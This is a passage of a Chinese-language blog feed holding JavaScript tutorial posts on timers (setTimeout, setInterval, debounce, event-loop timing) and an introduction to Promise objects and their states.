    <content><![CDATA[<p><font color=#2eb806>夜莺啼绿柳 皓月醒长空 最爱垄头麦 迎风笑落红</font></p>
<h2 id="JS异步操作"><a href="#JS异步操作" class="headerlink" title="JS异步操作"></a>JS异步操作</h2><h3 id="2-定时器"><a href="#2-定时器" class="headerlink" title="2. 定时器"></a>2. 定时器</h3><p>JavaScript 提供定时执行代码的功能，叫做定时器（timer），主要由<code>setTimeout()</code>和<code>setInterval()</code>这两个函数来完成。它们向任务队列添加定时任务。</p>
<h4 id="2-1-setTimeout"><a href="#2-1-setTimeout" class="headerlink" title="2.1  setTimeout()"></a>2.1  setTimeout()</h4><p><code>setTimeout</code>函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> timerId = <span class="built_in">setTimeout</span>(func|code, delay);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setTimeout</code>函数接受两个参数，第一个参数<code>func|code</code>是将要推迟执行的函数名或者一段代码，第二个参数<code>delay</code>是推迟执行的毫秒数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;console.log(2)&#x27;</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码会先输出1和3，然后等待1000毫秒再输出2。注意，<code>console.log(2)</code>必须以字符串的形式，作为<code>setTimeout</code>的参数。<br>如果推迟执行的是函数，就直接将函数名，作为<code>setTimeout</code>的参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(f, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><code>setTimeout</code>的第二个参数如果省略，则默认为0。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(f)</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">setTimeout</span>(f, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>除了前两个参数，<code>setTimeout</code>还允许更多的参数。它们将依次传入推迟执行的函数（回调函数）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a + b);</span><br><span class="line">&#125;, <span class="number">1000</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setTimeout</code>共有4个参数。最后那两个参数，将在1000毫秒之后回调函数执行时，作为回调函数的参数。</p>
<p>还有一个需要注意的地方，如果回调函数是对象的方法，那么<code>setTimeout</code>使得方法内部的<code>this</code>关键字指向全局环境，而不是定义时所在的那个对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">2</span>,</span><br><span class="line">  y: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(obj.y, <span class="number">1000</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码输出的是1，而不是2。因为当<code>obj.y</code>在1000毫秒后运行时，<code>this</code>所指向的已经不是<code>obj</code>了，而是全局环境。</p>
<p>为了防止出现这个问题，一种解决方法是将<code>obj.y</code>放入一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">2</span>,</span><br><span class="line">  y: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  obj.y();</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.y</code>放在一个匿名函数之中，这使得<code>obj.y</code>在<code>obj</code>的作用域执行，而不是在全局作用域内执行，所以能够显示正确的值。</p>
<p>另一种解决方法是，使用<code>bind</code>方法，将<code>obj.y</code>这个方法绑定在<code>obj</code>上面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">2</span>,</span><br><span class="line">  y: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(obj.y.bind(obj), <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-setInterval"><a href="#2-2-setInterval" class="headerlink" title="2.2 setInterval()"></a>2.2 setInterval()</h4><p><code>setInterval</code>函数的用法与<code>setTimeout</code>完全一致，区别仅仅在于<code>setInterval</code>指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中，每隔1000毫秒就输出一个2，会无限运行下去，直到关闭当前窗口。</p>
<p>与<code>setTimeout</code>一样，除了前两个参数，<code>setInterval</code>方法还可以接受更多的参数，它们会传入回调函数。</p>
<p>下面是一个通过<code>setInterval</code>方法实现网页动画的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;someDiv&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> opacity = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> fader = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  opacity -= <span class="number">0.1</span>;</span><br><span class="line">  <span class="keyword">if</span> (opacity &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    div.style.opacity = opacity;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(fader);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码每隔100毫秒，设置一次<code>div</code>元素的透明度，直至其完全透明为止。</p>
<p><code>setInterval</code>的一个常见用途是实现轮询。下面是一个轮询 URL 的 Hash 值是否发生变化的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="built_in">window</span>.location.hash;</span><br><span class="line"><span class="keyword">var</span> hashWatcher = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.location.hash != hash) &#123;</span><br><span class="line">    updatePage();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><code>setInterval</code>指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如，<code>setInterval</code>指定每 100ms 执行一次，每次执行需要 5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。</p>
<p>为了确保两次执行之间有固定的间隔，可以不用<code>setInterval</code>，而是每次执行结束后，使用<code>setTimeout</code>指定下一次执行的具体时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  timer = <span class="built_in">setTimeout</span>(f, <span class="number">2000</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码可以确保，下一次执行总是在本次执行结束之后的2000毫秒开始</p>
<h4 id="2-3-clearTimeout-，clearInterval"><a href="#2-3-clearTimeout-，clearInterval" class="headerlink" title="2.3 clearTimeout()，clearInterval()"></a>2.3 clearTimeout()，clearInterval()</h4><p><code>setTimeout</code>和<code>setInterval</code>函数，都返回一个整数值，表示计数器编号。将该整数传入<code>clearTimeout</code>和<code>clearInterval</code>函数，就可以取消对应的定时器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> id1 = <span class="built_in">setTimeout</span>(f, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">var</span> id2 = <span class="built_in">setInterval</span>(f, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">clearTimeout</span>(id1);</span><br><span class="line"><span class="built_in">clearInterval</span>(id2);</span><br></pre></td></tr></table></figure>
<p>上面代码中，回调函数f不会再执行了，因为两个定时器都被取消了。</p>
<p><code>setTimeout</code>和<code>setInterval</code>返回的整数值是连续的，也就是说，第二个<code>setTimeout</code>方法返回的整数值，将比第一个的整数值大1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(f, <span class="number">1000</span>) <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">setTimeout</span>(f, <span class="number">1000</span>) <span class="comment">// 11</span></span><br><span class="line"><span class="built_in">setTimeout</span>(f, <span class="number">1000</span>) <span class="comment">// 12</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，连续调用三次<code>setTimeout</code>，返回值都比上一次大了1。</p>
<p>利用这一点，可以写一个函数，取消当前所有的<code>setTimeout</code>定时器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 每轮事件循环检查一次</span></span><br><span class="line">  <span class="keyword">var</span> gid = <span class="built_in">setInterval</span>(clearAllTimeouts, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">clearAllTimeouts</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (id &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id !== gid) &#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(id);</span><br><span class="line">      &#125;</span><br><span class="line">      id--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>上面代码中，先调用<code>setTimeout</code>，得到一个计算器编号，然后把编号比它小的计数器全部取消。</p>
<h4 id="2-4-实例：debounce-函数"><a href="#2-4-实例：debounce-函数" class="headerlink" title="2.4 实例：debounce 函数"></a>2.4 实例：debounce 函数</h4><p>有时，我们不希望回调函数被频繁调用。比如，用户填入网页输入框的内容，希望通过 Ajax 方法传回服务器，jQuery 的写法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;textarea&#x27;</span>).on(<span class="string">&#x27;keydown&#x27;</span>, ajaxAction);</span><br></pre></td></tr></table></figure>
<p>这样写有一个很大的缺点，就是如果用户连续击键，就会连续触发<code>keydown</code>事件，造成大量的 Ajax 通信。这是不必要的，而且很可能产生性能问题。正确的做法应该是，设置一个门槛值，表示两次 Ajax 通信的最小间隔时间。如果在间隔时间内，发生新的<code>keydown</code>事件，则不触发 Ajax 通信，并且重新开始计时。如果过了指定时间，没有发生新的<code>keydown</code>事件，再将数据发送出去。</p>
<p>这种做法叫做 debounce（防抖动）。假定两次 Ajax 通信的间隔不得小于2500毫秒，上面的代码可以改写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;textarea&#x27;</span>).on(<span class="string">&#x27;keydown&#x27;</span>, debounce(ajaxAction, <span class="number">2500</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timer = <span class="literal">null</span>; <span class="comment">// 声明计时器</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      fn.apply(context, args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，只要在2500毫秒之内，用户再次击键，就会取消上一次的定时器，然后再新建一个定时器。这样就保证了回调函数之间的调用间隔，至少是2500毫秒。</p>
<h4 id="2-5-运行机制"><a href="#2-5-运行机制" class="headerlink" title="2.5 运行机制"></a>2.5 运行机制</h4><p><code>setTimeout</code>和<code>setInterval</code>的运行机制，是将指定的代码移出本轮事件循环，等到下一轮事件循环，再检查是否到了指定时间。如果到了，就执行对应的代码；如果不到，就继续等待。</p>
<p>这意味着，<code>setTimeout</code>和<code>setInterval</code>指定的回调函数，必须等到本轮事件循环的所有同步任务都执行完，才会开始执行。由于前面的任务到底需要多少时间执行完，是不确定的，所以没有办法保证，<code>setTimeout</code>和<code>setInterval</code>指定的任务，一定会按照预定时间执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(someTask, <span class="number">100</span>);</span><br><span class="line">veryLongTask();</span><br></pre></td></tr></table></figure>
<p>上面代码的<code>setTimeout</code>，指定100毫秒以后运行一个任务。但是，如果后面的<code>veryLongTask</code>函数（同步任务）运行时间非常长，过了100毫秒还无法结束，那么被推迟运行的<code>someTask</code>就只有等着，等到<code>veryLongTask</code>运行结束，才轮到它执行。</p>
<p>再看一个<code>setInterval</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">while</span> ((<span class="built_in">Date</span>.now() - start) &lt; ms) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setInterval</code>要求每隔1000毫秒，就输出一个2。但是，紧接着的<code>sleep</code>语句需要3000毫秒才能完成，那么<code>setInterval</code>就必须推迟到3000毫秒之后才开始生效。注意，生效后<code>setInterval</code>不会产生累积效应，即不会一下子输出三个2，而是只会输出一个2。</p>
<h4 id="2-6-setTimeout-f-0"><a href="#2-6-setTimeout-f-0" class="headerlink" title="2.6 setTimeout(f, 0)"></a>2.6 setTimeout(f, 0)</h4><h5 id="2-6-1-含义"><a href="#2-6-1-含义" class="headerlink" title="2.6.1 含义"></a>2.6.1 含义</h5><p><code>setTimeout</code>的作用是将代码推迟到指定时间执行，如果指定时间为<code>0</code>，即<code>setTimeout(f, 0)</code>，那么会立刻执行吗？</p>
<p>答案是不会。因为上一节说过，必须要等到当前脚本的同步任务，全部处理完以后，才会执行<code>setTimeout</code>指定的回调函数<code>f</code>。也就是说，<code>setTimeout(f, 0)</code>会在下一轮事件循环一开始就执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码先输出<code>2</code>，再输出<code>1</code>。因为<code>2</code>是同步任务，在本轮事件循环执行，而1是下一轮事件循环执行。</p>
<p>总之，<code>setTimeout(f, 0)</code>这种写法的目的是，尽可能早地执行<code>f</code>，但是并不能保证立刻就执行<code>f</code>。</p>
<p>实际上，<code>setTimeout(f, 0)</code>不会真的在0毫秒之后运行，不同的浏览器有不同的实现。以 Edge 浏览器为例，会等到4毫秒之后运行。如果电脑正在使用电池供电，会等到16毫秒之后运行；如果网页不在当前 Tab 页，会推迟到1000毫秒（1秒）之后运行。这样是为了节省系统资源。</p>
<h5 id="2-6-2-应用"><a href="#2-6-2-应用" class="headerlink" title="2.6.2 应用"></a>2.6.2 应用</h5><p><code>setTimeout(f, 0)</code>有几个非常重要的用途。它的一大应用是，可以调整事件的发生顺序。比如，网页开发中，某个事件先发生在子元素，然后冒泡到父元素，即子元素的事件回调函数，会早于父元素的事件回调函数触发。如果，想让父元素的事件回调函数先发生，就要用到<code>setTimeout(f, 0)</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;button&quot; id=&quot;myButton&quot; value=&quot;click&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myButton&#x27;</span>);</span><br><span class="line"></span><br><span class="line">input.onclick = <span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    input.value +=<span class="string">&#x27; input&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  input.value += <span class="string">&#x27; body&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码在点击按钮后，先触发回调函数<code>A</code>，然后触发函数<code>C</code>。函数<code>A</code>中，<code>setTimeout</code>将函数<code>B</code>推迟到下一轮事件循环执行，这样就起到了，先触发父元素的回调函数<code>C</code>的目的了。</p>
<p>另一个应用是，用户自定义的回调函数，通常在浏览器的默认动作之前触发。比如，用户在输入框输入文本，<code>keypress</code>事件会在浏览器接收文本之前触发。因此，下面的回调函数是达不到目的的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;input-box&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;input-box&#x27;</span>).onkeypress = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.value = <span class="built_in">this</span>.value.toUpperCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码想在用户每次输入文本后，立即将字符转为大写。但是实际上，它只能将本次输入前的字符转为大写，因为浏览器此时还没接收到新的文本，所以<code>this.value</code>取不到最新输入的那个字符。只有用<code>setTimeout</code>改写，上面的代码才能发挥作用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;input-box&#x27;</span>).onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    self.value = self.value.toUpperCase();</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码将代码放入<code>setTimeout</code>之中，就能使得它在浏览器接收到文本之后触发。</p>
<p>由于<code>setTimeout(f, 0)</code>实际上意味着，将任务放到浏览器最早可得的空闲时段执行，所以那些计算量大、耗时长的任务，常常会被放到几个小部分，分别放到<code>setTimeout(f, 0)</code>里面执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0xA00000</span>; i &lt; <span class="number">0xFFFFFF</span>; i++) &#123;</span><br><span class="line">  div.style.backgroundColor = <span class="string">&#x27;#&#x27;</span> + i.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> timer;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0x100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  timer = <span class="built_in">setTimeout</span>(func, <span class="number">0</span>);</span><br><span class="line">  div.style.backgroundColor = <span class="string">&#x27;#&#x27;</span> + i.toString(<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> (i++ == <span class="number">0xFFFFFF</span>) <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timer = <span class="built_in">setTimeout</span>(func, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码有两种写法，都是改变一个网页元素的背景色。写法一会造成浏览器“堵塞”，因为 JavaScript 执行速度远高于 DOM，会造成大量 DOM 操作“堆积”，而写法二就不会，这就是<code>setTimeout(f, 0)</code>的好处。</p>
<p>另一个使用这种技巧的例子是代码高亮的处理。如果代码块很大，一次性处理，可能会对性能造成很大的压力，那么将其分成一个个小块，一次处理一块，比如写成<code>setTimeout(highlightNext, 50)</code>的样子，性能压力就会减轻。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS异步操作-定时器</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0033</title>
    <url>/2021/05/22/%E6%89%93%E5%8D%A10033/</url>
    <content><![CDATA[<p><font color=#ef5b9c>你相信时间会抚平一切，可时过境迁，你已不复醒</font></p>
<h2 id="JS异步操作"><a href="#JS异步操作" class="headerlink" title="JS异步操作"></a>JS异步操作</h2><h3 id="3-Promise对象"><a href="#3-Promise对象" class="headerlink" title="3. Promise对象"></a>3. Promise对象</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p>Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口。Promise 可以让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数。</p>
<p>注意，本章只是 Promise 对象的简单介绍。为了避免与后续教程的重复，更完整的介绍请看《ES6 标准入门》的《Promise 对象》一章。</p>
<p>首先，Promise 是一个对象，也是一个构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 异步代码...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(f1);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Promise</code>构造函数接受一个回调函数<code>f1</code>作为参数，<code>f1</code>里面是异步操作的代码。然后，返回的<code>p1</code>就是一个 Promise 实例。</p>
<p>Promise 的设计思想是，所有异步任务都返回一个 Promise 实例。Promise 实例有一个<code>then</code>方法，用来指定下一步的回调函数。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(f1);</span><br><span class="line">p1.then(f2);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>f1</code>的异步操作执行完成，就会执行<code>f2</code>。</p>
<p>传统的写法可能需要把<code>f2</code>作为回调函数传入<code>f1</code>，比如写成<code>f1(f2)</code>，异步操作完成后，在<code>f1</code>内部调用<code>f2</code>。Promise 使得<code>f1</code>和<code>f2</code>变成了链式写法。不仅改善了可读性，而且对于多层嵌套的回调函数尤其方便。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统写法</span></span><br><span class="line">step1(<span class="function"><span class="keyword">function</span> (<span class="params">value1</span>) </span>&#123;</span><br><span class="line">  step2(value1, <span class="function"><span class="keyword">function</span>(<span class="params">value2</span>) </span>&#123;</span><br><span class="line">    step3(value2, <span class="function"><span class="keyword">function</span>(<span class="params">value3</span>) </span>&#123;</span><br><span class="line">      step4(value3, <span class="function"><span class="keyword">function</span>(<span class="params">value4</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise 的写法</span></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Promise</span>(step1))</span><br><span class="line">  .then(step2)</span><br><span class="line">  .then(step3)</span><br><span class="line">  .then(step4);</span><br></pre></td></tr></table></figure>
<p>从上面代码可以看到，采用 Promises 以后，程序流程变得非常清楚，十分易读。注意，为了便于理解，上面代码的<code>Promise</code>实例的生成格式，做了简化，真正的语法请参照下文。</p>
<p>总的来说，传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promise 就是解决这个问题，使得异步流程可以写成同步流程。</p>
<p>Promise 原本只是社区提出的一个构想，一些函数库率先实现了这个功能。ECMAScript 6 将其写入语言标准，目前 JavaScript 原生支持 Promise 对象。</p>
<h4 id="3-2-Promise-对象的状态"><a href="#3-2-Promise-对象的状态" class="headerlink" title="3.2 Promise 对象的状态"></a>3.2 Promise 对象的状态</h4><p>Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。</p>
<ul>
<li>异步操作未完成（pending）</li>
<li>异步操作成功（fulfilled）</li>
<li>异步操作失败（rejected）</li>
</ul>
<p>上面三种状态里面，<code>fulfilled</code>和<code>rejected</code>合在一起称为<code>resolved</code>（已定型）。</p>
<p>这三种的状态的变化途径只有两种。</p>
<ul>
<li>从“未完成”到“成功”</li>
<li>从“未完成”到“失败”</li>
</ul>
<p>一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。</p>
<p>因此，Promise 的最终结果只有两种。</p>
<ul>
<li>异步操作成功，Promise 实例传回一个值（value），状态变为<code>fulfilled</code>。</li>
<li>异步操作失败，Promise 实例抛出一个错误（error），状态变为<code>rejected</code>。</li>
</ul>
